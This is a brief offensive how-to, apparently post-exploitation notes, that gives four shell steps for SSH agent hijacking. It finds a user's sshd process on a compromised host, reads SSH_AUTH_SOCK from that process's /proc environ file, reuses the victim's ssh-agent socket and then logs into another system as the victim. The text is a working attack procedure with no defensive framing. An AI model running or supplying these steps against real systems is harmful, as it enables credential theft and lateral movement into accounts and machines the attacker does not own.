Step 1: We first determine the SSH process ID of the user on the
compromised host: 
```bash
ps aux |grep sshd
```

Step 2: Determine the SSH_AUTH_SOCK environment variable for the sshd PID:
```bash
grep SSH_AUTH_SOCK /proc/<PID>/environ
```

Step 3: We then hijack the targets ssh-agent socket:

```bash
SSH_AUTH_SOCK=/tmp/ssh-XXXXXXX/agent.XXXX ssh-add –l
```


Step 4: Finally, we log into the remote system our victim is logged into as the target: 
```bash
ssh remotesystem -l victim
```